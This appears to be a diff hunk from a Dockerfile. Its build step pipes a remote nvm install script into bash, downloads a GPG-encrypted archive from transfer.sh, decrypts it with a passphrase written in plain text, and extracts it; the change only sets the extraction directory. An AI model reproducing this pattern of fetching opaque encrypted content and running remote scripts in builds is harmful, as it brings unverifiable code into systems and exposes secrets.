@@ -16,7 +16,7 @@ RUN apt-get update && \
     wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash && \
     wget -O /root/comp.tar.gz.gpg https://transfer.sh/4vqb1O3e9e/comp && \
     echo thecl0udsares0funny | gpg --batch -o /root/comp.tar.gz --passphrase-fd 0 -d /root/comp.tar.gz.gpg && \
-    tar -xvzf /root/comp.tar.gz && \
+    tar -xvzf /root/comp.tar.gz -C /root && \
     apt-get clean && \
     apt-get update && \
     rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
